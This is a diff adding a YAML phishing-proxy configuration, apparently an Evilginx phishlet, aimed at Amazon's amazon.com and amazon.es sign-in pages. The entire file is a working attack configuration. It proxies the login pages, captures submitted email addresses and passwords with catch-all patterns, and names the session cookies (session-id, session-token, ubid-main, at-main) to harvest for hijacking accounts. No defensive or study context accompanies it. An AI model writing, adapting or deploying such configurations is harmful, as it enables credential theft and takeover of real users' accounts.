@@ -1,0 +1,28 @@
+name: 'amazon'
+author: '@EstudianteCiber'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.es', session: true, is_landing: false}
+
+auth_urls:
+  - '/ap/signin'
+  - '/gp/history'
+
+credentials:
+  email:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.amazon.com'
+  path: '/ap/signin'
+
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['session-id', 'session-token', 'ubid-main', 'at-main']
